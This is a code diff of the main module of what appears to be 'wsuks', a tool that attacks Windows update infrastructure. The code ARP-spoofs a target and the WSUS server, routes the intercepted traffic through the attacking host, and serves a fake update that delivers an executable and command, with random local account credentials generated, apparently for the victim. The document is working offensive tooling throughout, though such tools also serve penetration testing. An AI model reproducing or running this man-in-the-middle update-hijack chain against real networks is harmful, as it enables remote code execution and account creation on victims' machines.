@@ -7,19 +7,24 @@ import os
 from pprint import pformat
 import random
 from string import digits, ascii_letters
-from scapy.all import get_if_addr, sniff
+from threading import Thread
+from scapy.all import get_if_addr, sniff, conf, IP, TCP, send
 from wsuks.helpers.arpspoofer import ArpSpoofer
 from wsuks.helpers.logger import initLogger
 from wsuks.helpers.argparser import initParser, printBanner
 from wsuks.helpers.sysvolparser import SysvolParser
 from wsuks.helpers.wsusserver import WSUSUpdateHandler, WSUSBaseServer
+from wsuks.helpers.router import Router
 from termcolor import colored
 
 
 class Wsuks:
     def __init__(self, args):
+        self.args = args
+
         self.logger = logging.getLogger("wsuks")
-        self.hostIp = get_if_addr(args.interface)
+        self.interface = args.interface
+        self.hostIp = get_if_addr(self.interface)
         self.local_username = "user" + "".join(random.choice(digits) for i in range(5))
         self.local_password = "".join(random.sample(ascii_letters, 16))
 
@@ -58,12 +63,23 @@ class Wsuks:
         else:
             self.logger.info(f"WSUS Server specified manually: {self.wsusIp}:{self.wsusPort}")
 
+        #print(conf.route)
+        #conf.route.add(host=self.wsusIp, gw=self.hostIp)
+        #print(conf.route)
+
         # Start Arp Spoofing
         arpspoofer = ArpSpoofer()
         arpspoofer.start(self.targetIp, self.wsusIp)
 
         # Prepare WSUS Update Handler
-        # sniff(filter="tcp and port 8530", prn=self.handlePacket, store=0)
+        router = Router()
+        router.start(self.targetIp, self.hostIp, self.wsusIp, self.interface)
+
+        #t1 = Thread(target=self.run_sniff, args=(self))
+        #t1.start()
+        #sniff(filter=f"tcp", prn=self.handlePacket, store=0, iface=self.args.interface)
+        #print("TEST")
+
         update_handler = WSUSUpdateHandler(self.executable_file, self.executable_name, f'{self.hostIp}:{self.wsusPort}')
         update_handler.set_resources_xml(self.command)
 
@@ -79,10 +95,13 @@ class Wsuks:
             print("")
             self.logger.info("Stopping WSUS Server...")
         finally:
+            router.stop()
             arpspoofer.stop()
 
     def handlePacket(self, packet):
-        packet.show()
+        #and (packet[IP].src == self.targetIp or packet[IP].src == self.hostIp or packet[IP].src == self.wsusIp)
+        if IP in packet and TCP in packet and packet[IP].src == self.targetIp:
+            packet.show()
 
 
 def main():
